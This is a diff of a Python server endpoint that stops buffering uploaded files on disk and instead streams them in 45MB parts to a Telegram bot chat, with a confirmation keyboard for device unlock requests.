@@ -1216,86 +1216,86 @@ async def upload(
 
     caption = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"
 
-    # Читаем файл на диск чанками — НЕ грузим весь файл в RAM
-    import pathlib
-    tmp_dir = pathlib.Path(tempfile.gettempdir()) / "pc_uploads"
-    tmp_dir.mkdir(exist_ok=True)
-    tmp_path = tmp_dir / f"{uuid.uuid4().hex}_{filename}"
-    total_size = 0
-    CHUNK = 1 * 1024 * 1024  # читаем по 1MB
-    try:
-        with open(tmp_path, "wb") as f_out:
-            while True:
-                chunk = await file.read(CHUNK)
+    # Читаем входящий стрим чанками по 45MB и сразу шлём в Telegram
+    # Диск не используем вообще — RAM максимум 45MB на чанк
+    PART_SIZE = 45 * 1024 * 1024
+    READ_CHUNK = 256 * 1024  # читаем по 256KB внутри каждого парта
+
+    ext = filename.lower().rsplit(".", 1)[-1] if "." in filename else ""
+    base_name = filename.rsplit(".", 1)[0] if "." in filename else filename
+
+    async def _stream_to_tg(fname: str, cap: str, rm=None):
+        part_index = 0
+        total_size = 0
+        eof = False
+
+        while not eof:
+            # Накапливаем один парт в памяти (макс 45MB)
+            part_buf = bytearray()
+            while len(part_buf) < PART_SIZE:
+                chunk = await file.read(READ_CHUNK)
                 if not chunk:
+                    eof = True
                     break
-                f_out.write(chunk)
+                part_buf.extend(chunk)
                 total_size += len(chunk)
-    except Exception as e:
-        print(f"upload write error: {e}")
-        raise HTTPException(status_code=500, detail="Write failed")
 
-    async def _send_from_disk(path: pathlib.Path, fname: str, cap: str, rm=None):
-        """Читает файл с диска и отправляет в Telegram частями по 45MB."""
-        PART_SIZE = 45 * 1024 * 1024
-        ext = fname.lower().rsplit(".", 1)[-1] if "." in fname else ""
-        if ext in ("jpg", "jpeg", "png", "webp", "gif"):
-            method = "sendPhoto"; field = "photo"
-        elif ext in ("mp4", "mov", "avi", "mkv", "3gp"):
-            method = "sendVideo"; field = "video"
-        else:
-            method = "sendDocument"; field = "document"
+            if not part_buf:
+                break
 
-        file_size = path.stat().st_size
-        num_parts = max(1, (file_size + PART_SIZE - 1) // PART_SIZE)
-        base_name = fname.rsplit(".", 1)[0] if "." in fname else fname
-        print(f"_send_from_disk: {fname} {file_size/1024/1024:.1f}MB -> {num_parts} parts")
+            part_index += 1
+            is_first_and_only = (part_index == 1 and eof)
 
-        try:
-            with open(path, "rb") as fp:
-                for i in range(num_parts):
-                    chunk = fp.read(PART_SIZE)
-                    if not chunk:
-                        break
-                    if num_parts == 1:
-                        part_name = fname
-                        part_cap  = cap
-                    else:
-                        part_name = f"{base_name}_part{i+1}of{num_parts}.{ext if ext else 'bin'}"
-                        part_cap  = f"{cap + ' ' if cap else ''}[{i+1}/{num_parts}]"
-                    try:
-                        async with httpx.AsyncClient(timeout=300) as client:
-                            fdata = {field if num_parts == 1 else "document": (part_name, chunk)}
-                            pdata = {"chat_id": chat_id, "caption": part_cap}
-                            if rm and num_parts == 1:
-                                import json as _j
-                                pdata["reply_markup"] = _j.dumps(rm)
-                                pdata["parse_mode"] = "Markdown"
-                            send_method = (method if num_parts == 1 else "sendDocument")
-                            r = await client.post(
-                                f"https://api.telegram.org/bot{BOT_TOKEN}/{send_method}",
-                                data=pdata, files=fdata
-                            )
-                            print(f"send_from_disk part {i+1}/{num_parts} -> {r.status_code}")
-                    except Exception as e:
-                        print(f"send_from_disk part {i+1} error: {e}")
-        finally:
+            if is_first_and_only:
+                part_name = fname
+                part_cap  = cap
+                f_ext = ext
+            else:
+                part_name = f"{base_name}_part{part_index}.{ext if ext else 'bin'}"
+                part_cap  = f"{cap} [part {part_index}]" if cap else f"part {part_index}"
+                f_ext = ext
+
+            # Выбираем метод Telegram
+            if is_first_and_only and f_ext in ("jpg", "jpeg", "png", "webp", "gif"):
+                method, field = "sendPhoto", "photo"
+            elif is_first_and_only and f_ext in ("mp4", "mov", "avi", "mkv", "3gp"):
+                method, field = "sendVideo", "video"
+            else:
+                method, field = "sendDocument", "document"
+
+            print(f"_stream_to_tg part {part_index}: {len(part_buf)/1024/1024:.1f}MB -> {method}")
             try:
-                path.unlink()
-            except Exception:
-                pass
+                async with httpx.AsyncClient(timeout=300) as client:
+                    pdata = {"chat_id": chat_id, "caption": part_cap}
+                    if rm and is_first_and_only:
+                        import json as _j
+                        pdata["reply_markup"] = _j.dumps(rm)
+                        pdata["parse_mode"] = "Markdown"
+                    r = await client.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
+                        data=pdata,
+                        files={field: (part_name, bytes(part_buf))}
+                    )
+                    print(f"_stream_to_tg part {part_index} -> {r.status_code}")
+            except Exception as e:
+                print(f"_stream_to_tg part {part_index} error: {e}")
+
+            part_buf.clear()
+
+        print(f"_stream_to_tg done: {part_index} parts, {total_size/1024/1024:.1f}MB total")
+        return total_size
 
     if x_code_upload == "true":
         cap_md = (f"📸 *Запрос на разблокировку*\nУстройство: `{escape_md(dev_id)}`"
                   f"\nФайл: {escape_md(filename)}\n\nПодтвердить разблокировку?")
-        asyncio.create_task(_send_from_disk(
-            tmp_path, filename, cap_md,
+        asyncio.create_task(_stream_to_tg(
+            filename, cap_md,
             rm=code_confirm_keyboard(dev_id, chat_id)
         ))
     else:
-        asyncio.create_task(_send_from_disk(tmp_path, filename, caption))
+        asyncio.create_task(_stream_to_tg(filename, caption))
 
-    return {"ok": True, "size": total_size}
+    return {"ok": True}
 
 
 # ─── Video list endpoint ─────────────────────────────────────────────────────
